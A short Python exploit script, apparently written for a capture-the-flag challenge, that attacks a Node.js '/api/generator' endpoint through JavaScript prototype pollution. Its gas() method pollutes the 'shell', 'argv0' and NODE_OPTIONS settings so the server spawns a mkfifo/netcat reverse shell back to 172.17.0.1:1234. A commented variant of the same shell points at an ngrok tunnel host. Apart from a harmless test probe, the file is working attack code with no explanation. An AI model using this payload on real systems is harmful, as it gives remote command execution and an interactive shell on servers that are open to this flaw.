import requests, json

class PP:
    def __init__(self):
        # self.baseUrl = "http://178.128.101.5:52271"
        self.baseUrl = "http://localhost:52271"

    def test(self):
        payload = {"__proto__":{"message":"gh0st"}}
        data = {"js":json.dumps(payload)}
        print(data)
        r = requests.post(self.baseUrl + "/api/generator",json=data)
        return r.text
    
    def gas(self):
        # payload = {"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh 2>&1|nc 0.tcp.ap.ngrok.io 16393 > /tmp/f').toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}
        payload = {"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh 2>&1|nc 172.17.0.1 1234 > /tmp/f').toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}
        data = {"js":json.dumps(payload)}
        r = requests.session().post(self.baseUrl + "/api/generator",json=data)
        return r.text


if __name__ == "__main__":
    exploit = PP()
    # print(exploit.test())
    print(exploit.gas())